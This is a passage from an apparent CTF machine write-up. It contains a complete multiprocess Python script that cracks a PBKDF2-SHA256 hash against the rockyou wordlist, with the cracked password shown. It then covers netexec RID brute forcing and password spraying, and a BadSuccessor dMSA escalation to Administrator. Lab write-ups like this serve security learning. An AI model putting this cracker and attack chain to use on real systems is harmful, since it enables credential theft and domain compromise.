As we can see on this page, it gives us the structure the hash should have. But even after adjusting the structure so hashcat could read it, it still couldn't crack the hash, so I chose to write my own hash cracker for this case:

```python
#!/usr/bin/env python3
import hashlib                              # Library for hashing algorithms (PBKDF2, SHA256, etc.)
from multiprocessing import Pool, cpu_count # To use all CPU cores

def check_password(password):
    """
    Function that each core (worker) will run independently.
    """
    try:
        # PBKDF2_HMAC: the key-derivation algorithm.
        # Slow by design (600,000 iterations) to make cracking harder.
        computed = hashlib.pbkdf2_hmac(
            'sha256',
            password,          # the wordlist entry (in bytes)
            SALT.encode(),     # the salt converted to bytes
            ITERATIONS         # the number of hashing rounds
        )

        # Compare the generated result against our target (TARGET_HASH)
        if computed.hex() == TARGET_HASH:
            # If it matches, decode the bytes to text and return them
            return password.decode(errors="ignore")
    except:
        # If a specific word errors out, ignore it and move on
        pass

    return None  # If it doesn't match, return nothing

# ---- Hash components (configuration) ----
SALT = "AMtzteQIG7yAbZIa"
ITERATIONS = 600000
TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"

# ---- Path to your wordlist ----
WORDLIST = "/usr/share/wordlists/rockyou.txt"

def main():
    print(f"[+] Using wordlist: {WORDLIST}")
    print("[+] Starting PBKDF2-SHA256 cracking...")

    # First 'with': ensures the file closes on its own, even if the script fails.
    # Opened in "rb" (read binary) so the generator works with bytes directly.
    with open(WORDLIST, "rb") as f:

        # Generator: reads the file line by line without loading it all into RAM.
        # line.strip() removes the newlines (\n) from each word.
        passwords = (line.strip() for line in f)

        # Second 'with': creates the pool of processes.
        # cpu_count() detects how many cores your machine has to use them all.
        with Pool(cpu_count()) as pool:

            # imap_unordered: spreads the words across the cores.
            # chunksize=500: sends batches of 500 words to each core for efficiency.
            for result in pool.imap_unordered(check_password, passwords, chunksize=500):

                # If any core finds the password (stops being None):
                if result:
                    print(f"[+] PASSWORD FOUND: {result}")
                    # Terminate the other processes immediately to save resources
                    pool.terminate()
                    return

    # If the generator is exhausted and nobody returned a result
    print("[-] No match found.")

# Entry point to prevent the code from running infinitely when spawning child processes
if __name__ == "__main__":
    main()
```

Explanation of this Python script in my "Mi_Camino" repository.

We manage to crack the hash with the script; the password is `iloveyou1`. We just need to figure out which user it belongs to. For that we can do a password spray, but we need a user list first, which we'll build with RID brute forcing. We can use netexec for this task:

```bash
sudo netexec mssql 10.129.27.119
```

We see we have CREATE_CHILD permissions, which can let us create a child (any object class) under the Staff OU (Organizational Unit). Why does this catch my attention?

In recent AD versions, Windows Server 2025 introduced a new object class called dMSA (Delegated Managed Service Account). The existence of this object class, plus CREATE_CHILD, leads to a BadSuccessor vulnerability (more info in the Mi_Camino repository).

First we need to create this malicious account pointing at the Administrator. For this we can use the BadSuccessor.ps1 tool:

![](/Hacked-Machines/assets/images/Pasted%20image%2020260419140441.png)

![](/Hacked-Machines/assets/images/Pasted%20image%2020260419142455.png)
